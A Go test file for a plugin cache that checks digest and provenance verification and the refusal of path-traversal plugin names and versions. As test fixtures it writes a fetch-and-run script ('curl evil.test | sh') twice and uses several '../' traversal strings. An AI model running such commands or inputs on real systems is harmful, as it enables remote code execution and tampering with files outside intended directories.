package plugindist

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/setthasit/Lore/internal/config"
	"github.com/setthasit/Lore/internal/errors/internalerror"
	"github.com/setthasit/Lore/internal/plugindist/plugindisttest"
)

func TestPluginBinaryRefusesARewrittenCachedBinary(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, result := scene.installed(t)

	if err := os.WriteFile(result.Binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
		t.Fatalf("rewrite the cached binary: %v", err)
	}

	_, err := scene.store.Binary(scene.coord, lock)
	if err == nil {
		t.Fatal("launching a rewritten cached binary succeeded, want a refusal")
	}
	if !internalerror.IsPrecondition(err) {
		t.Fatalf("kind = %v, want precondition", internalerror.KindOf(err))
	}
	for _, want := range []string{
		"plugins[linear]", "digest mismatch", scene.store.platform.Key(), result.BinaryDigest,
		"lore plugin install linear",
	} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
}

func TestPluginBinaryRefusesACacheWrittenByAnotherInstall(t *testing.T) {
	t.Parallel()

	const otherOrigin = "github.com/evil/lore-linear@v0.3.1"
	otherArtifact := "sha256:" + strings.Repeat("b", 64)

	cases := []struct {
		name    string
		rewrite func(installRecord) installRecord
		want    string
	}{
		{
			name:    "the cache holds the install of another origin",
			rewrite: func(record installRecord) installRecord { record.From = otherOrigin; return record },
			want:    otherOrigin,
		},
		{
			name: "the cache holds the install of another artifact",
			rewrite: func(record installRecord) installRecord {
				record.ArtifactDigest = otherArtifact
				return record
			},
			want: otherArtifact,
		},
	}

	for _, test := range cases {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()

			scene := newScene(t)
			lock, result := scene.installed(t)
			dir := filepath.Dir(result.Binary)

			record, err := readInstallRecord(dir)
			if err != nil {
				t.Fatalf("read the install record: %v", err)
			}
			if err := writeInstallRecord(dir, test.rewrite(record)); err != nil {
				t.Fatalf("rewrite the install record: %v", err)
			}

			path, err := scene.store.Binary(scene.coord, lock)
			if err == nil {
				t.Fatalf("a cache written by another install resolved to %q, want a refusal", path)
			}
			if path != "" {
				t.Errorf("the refusal still reported the binary %q", path)
			}
			if !internalerror.IsPrecondition(err) {
				t.Errorf("kind = %v, want precondition", internalerror.KindOf(err))
			}
			wanted := []string{
				"plugins[linear]", "digest mismatch", scene.coord.From, digestOf(scene.archive),
				"lore plugin install linear", test.want,
			}
			for _, want := range wanted {
				if !strings.Contains(err.Error(), want) {
					t.Errorf("error %q does not mention %q", err, want)
				}
			}
		})
	}
}

func TestPluginBinaryRefusesAPinWithNoRecordedOrigin(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	entry, _ := lock.Entry("linear")
	entry.From = ""
	lock.Plugins["linear"] = entry

	path, err := scene.store.Binary(scene.coord, lock)
	if err == nil {
		t.Fatalf("a pin with no recorded origin resolved to %q, want a refusal", path)
	}
	if path != "" {
		t.Errorf("the refusal still reported the binary %q", path)
	}
	if !internalerror.IsPrecondition(err) {
		t.Errorf("kind = %v, want precondition", internalerror.KindOf(err))
	}
	for _, want := range []string{"plugins[linear]", "digest mismatch", "an unrecorded origin"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q does not mention %q", err, want)
		}
	}
}

func TestPluginBinaryRefusesACachedInstallWithNoRecordedProvenance(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, result := scene.installed(t)

	if err := os.Remove(filepath.Join(filepath.Dir(result.Binary), recordFileName)); err != nil {
		t.Fatalf("delete the install record: %v", err)
	}

	path, err := scene.store.Binary(scene.coord, lock)
	if err == nil {
		t.Fatalf("a cache with no recorded provenance resolved to %q, want a refusal", path)
	}
	if path != "" {
		t.Errorf("the refusal still reported the binary %q", path)
	}
	if !internalerror.IsPrecondition(err) {
		t.Errorf("kind = %v, want precondition", internalerror.KindOf(err))
	}

	message := internalerror.MessageOf(err)
	for _, want := range []string{"plugins[linear]", "cannot read the recorded provenance", "lore plugin install linear"} {
		if !strings.Contains(message, want) {
			t.Errorf("message %q does not mention %q", message, want)
		}
	}
	if strings.Contains(message, "is not installed") {
		t.Errorf("message %q reports a cached install as absent", message)
	}
}

func TestPluginBinaryLaunchesTheRecordedBinaryBesideAnUnrelatedFile(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, result := scene.installed(t)

	beside := filepath.Join(filepath.Dir(result.Binary), "LICENSE")
	if err := os.WriteFile(beside, []byte("MIT\n"), 0o600); err != nil {
		t.Fatalf("seed a file beside the cached binary: %v", err)
	}

	path, err := scene.store.Binary(scene.coord, lock)
	if err != nil {
		t.Fatalf("launching the recorded binary beside %s: %v", beside, err)
	}
	if path != result.Binary {
		t.Fatalf("binary = %q, want the recorded %q", path, result.Binary)
	}
}

func TestPluginBinaryWithoutALockEntryFailsAtStartup(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	elsewhere := NewStore(scene.store.root)
	elsewhere.platform = Platform{OS: "plan9", Arch: "mips"}
	_, err := elsewhere.Binary(scene.coord, lock)
	if err == nil {
		t.Fatal("launching a plugin locked for another platform succeeded, want a refusal")
	}
	for _, want := range []string{"plugins[linear]", LockFileName, "plan9/mips", "lore plugin install linear"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
}

func TestPluginBinaryNotInstalledNamesTheInstallCommand(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock := &Lock{}
	lock.Set("linear", "v0.3.1", scene.coord.From, scene.store.platform,
		LockArtifact{URL: "https://example.test/x.tar.gz", Digest: "sha256:aaaa"})

	_, err := scene.store.Binary(scene.coord, lock)
	if err == nil {
		t.Fatal("launching an uninstalled plugin succeeded, want a refusal")
	}

	for _, want := range []string{"plugins[linear]", "is not installed", "lore plugin install linear"} {
		if !strings.Contains(internalerror.MessageOf(err), want) {
			t.Fatalf("message %q does not mention %q", internalerror.MessageOf(err), want)
		}
	}
}

func TestPluginRemoveDeletesEveryCachedVersion(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	next := plugindisttest.Archive(t, scene.coord.binaryName(scene.store.platform), []byte("#!/bin/sh\necho v0.4.0\n"))
	moved, err := scene.coord.AtVersion("v0.4.0")
	if err != nil {
		t.Fatalf("move the coordinate: %v", err)
	}
	scene.fake.Publish("v0.4.0", map[string][]byte{moved.assetName(scene.store.platform): next})
	scene.coord = moved
	if _, err := scene.install(t, lock, true); err != nil {
		t.Fatalf("install v0.4.0: %v", err)
	}

	versions, err := scene.store.Remove("linear")
	if err != nil {
		t.Fatalf("remove: %v", err)
	}
	if versions != 2 {
		t.Fatalf("removed %d versions, want 2", versions)
	}
	if _, err := os.Stat(filepath.Join(scene.store.root, "plugins", "linear")); !os.IsNotExist(err) {
		t.Fatal("the plugin cache survived a removal")
	}

	if versions, err = scene.store.Remove("linear"); err != nil || versions != 0 {
		t.Fatalf("second remove: %d versions, %v", versions, err)
	}
}

func TestPluginBinaryLocalMissingFileIsRefused(t *testing.T) {
	t.Parallel()

	coord, err := Resolve(".", config.PluginDecl{Name: "scratch", From: filepath.Join(t.TempDir(), "lore-scratch")})
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}

	if _, err := NewStore(t.TempDir()).Binary(coord, &Lock{}); err == nil {
		t.Fatal("locating an absent local plugin succeeded, want a refusal")
	} else if !strings.Contains(err.Error(), "no file there") {
		t.Fatalf("error %q does not say the file is missing", err)
	}
}

func TestPluginStoreRootIsOverridable(t *testing.T) {
	t.Setenv(RootEnv, filepath.Join(t.TempDir(), "state"))

	root, err := defaultRoot()
	if err != nil {
		t.Fatalf("default root: %v", err)
	}
	if !strings.HasSuffix(root, "state") {
		t.Fatalf("root = %q, want the overridden directory", root)
	}
}

func TestPluginRemoveRefusesANameThatLeavesTheCache(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	sentinel := filepath.Join(scene.store.root, "myproject.db")
	if err := os.WriteFile(sentinel, []byte("an index the cache sits beside"), 0o600); err != nil {
		t.Fatalf("write the sentinel: %v", err)
	}

	for _, name := range []string{"..", "../..", "../pwned"} {
		versions, err := scene.store.Remove(name)
		if err == nil {
			t.Errorf("removing %q succeeded, want a refusal", name)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("name %q: kind = %v, want bad request", name, internalerror.KindOf(err))
		}
		if versions != 0 {
			t.Errorf("removing %q reported %d deleted versions", name, versions)
		}
	}

	if _, err := os.Stat(sentinel); err != nil {
		t.Fatalf("a file beside the plugin cache was deleted: %v", err)
	}
	if _, err := os.Stat(scene.store.root); err != nil {
		t.Fatalf("the cache root was deleted: %v", err)
	}
}

func TestStoreWriteRefusesABinaryNameThatIsNotOneFileName(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	_, result := scene.installed(t)
	dir := filepath.Dir(result.Binary)

	for _, binaryName := range []string{recordFileName, `..\..\evil.exe`, "sub/evil", ".."} {
		path, digest, err := scene.store.write(scene.coord, binaryName, []byte("evil\n"), "sha256:aaaa")
		if err == nil {
			t.Errorf("writing a binary named %q succeeded, want a refusal", binaryName)
		} else if !internalerror.IsPrecondition(err) {
			t.Errorf("name %q: kind = %v, want precondition", binaryName, internalerror.KindOf(err))
		} else if !strings.Contains(err.Error(), "plugins[linear]") {
			t.Errorf("error %q does not name the plugin", err)
		}
		if path != "" || digest != "" {
			t.Errorf("name %q reported path %q and digest %q", binaryName, path, digest)
		}
	}

	record, err := readInstallRecord(dir)
	if err != nil {
		t.Fatalf("read the install record: %v", err)
	}
	if want := digestOf([]byte(stubBinary)); record.BinaryDigest != want {
		t.Fatalf("recorded binary digest = %q, want the digest of the installed binary %q", record.BinaryDigest, want)
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("read the version directory: %v", err)
	}
	for _, entry := range entries {
		if strings.HasSuffix(entry.Name(), ".partial") {
			t.Errorf("a staged %q survived the refusal", entry.Name())
		}
	}
}

func TestPluginBinaryRefusesALockedVersionThatLeavesTheCache(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	const escape = "../../evil"
	plantedDir := filepath.Join(scene.store.root, "plugins", "linear", escape)
	if err := os.MkdirAll(plantedDir, 0o750); err != nil {
		t.Fatalf("plant the escape target: %v", err)
	}
	body := []byte("#!/bin/sh\ncurl evil.test | sh\n")
	if err := os.WriteFile(filepath.Join(plantedDir, "lore-linear"), body, 0o600); err != nil {
		t.Fatalf("plant the binary: %v", err)
	}
	// The planted record matches the planted binary, so only the version's shape can refuse it.
	planted := installRecord{
		Binary:         "lore-linear",
		BinaryDigest:   digestOf(body),
		ArtifactDigest: "sha256:aaaa",
		From:           scene.coord.From,
	}
	if err := writeInstallRecord(plantedDir, planted); err != nil {
		t.Fatalf("plant the install record: %v", err)
	}

	entry, _ := lock.Entry("linear")
	entry.Version = escape
	lock.Plugins["linear"] = entry

	path, err := scene.store.Binary(scene.coord, lock)
	if err == nil {
		t.Fatalf("a locked version that climbs out of the cache resolved to %q, want a refusal", path)
	}
	if path != "" {
		t.Errorf("the refusal still reported the binary %q", path)
	}
	if !internalerror.IsBadRequest(err) {
		t.Errorf("kind = %v, want bad request", internalerror.KindOf(err))
	}
	if strings.Contains(err.Error(), "digest mismatch") {
		t.Errorf("the traversal was refused by the digest re-check, not by the version: %v", err)
	}
	for _, want := range []string{"plugins[linear]", escape, "not a usable version"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q does not mention %q", err, want)
		}
	}
}

func TestStoreRefusesAVersionThatIsNotOneDirectoryName(t *testing.T) {
	t.Parallel()

	// The root is nested so that a version climbing four levels still lands under area.
	area := t.TempDir()
	store := NewStore(filepath.Join(area, "deep", "state"))
	for _, version := range []string{"", "..", "../../evil", "../../../../tmp/evil", `..\..\evil`} {
		if _, err := store.Dir("linear", version); err == nil {
			t.Errorf("Dir accepted the version %q", version)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("version %q: kind = %v, want bad request", version, internalerror.KindOf(err))
		}

		coord := Coordinate{Name: "linear", Origin: OriginGitHub, From: "github.com/jdoe/lore-linear", Version: version}
		path, digest, err := store.write(coord, "lore-linear", []byte("evil\n"), "sha256:aaaa")
		if err == nil {
			t.Errorf("write accepted the version %q", version)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("write of version %q: kind = %v, want bad request", version, internalerror.KindOf(err))
		}
		if path != "" || digest != "" {
			t.Errorf("write of version %q reported path %q and digest %q", version, path, digest)
		}
	}

	entries, err := os.ReadDir(area)
	if err != nil {
		t.Fatalf("read the temporary area: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("a refused version created %d entries around the cache root, want none", len(entries))
	}
}

func TestStoreRefusesANameThatIsNotOneDirectoryName(t *testing.T) {
	t.Parallel()

	area := t.TempDir()
	store := NewStore(filepath.Join(area, "deep", "state"))
	for _, name := range []string{"", "..", "../evil", `..\evil`} {
		if _, err := store.Dir(name, "v0.3.1"); err == nil {
			t.Errorf("Dir accepted the name %q", name)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("name %q: kind = %v, want bad request", name, internalerror.KindOf(err))
		}

		coord := Coordinate{Name: name, Origin: OriginGitHub, From: "github.com/jdoe/lore-linear", Version: "v0.3.1"}
		path, digest, err := store.write(coord, "lore-linear", []byte("evil\n"), "sha256:aaaa")
		if err == nil {
			t.Errorf("write accepted the name %q", name)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("write of name %q: kind = %v, want bad request", name, internalerror.KindOf(err))
		}
		if path != "" || digest != "" {
			t.Errorf("write of name %q reported path %q and digest %q", name, path, digest)
		}
	}

	entries, err := os.ReadDir(area)
	if err != nil {
		t.Fatalf("read the temporary area: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("a refused name created %d entries around the cache root, want none", len(entries))
	}
}
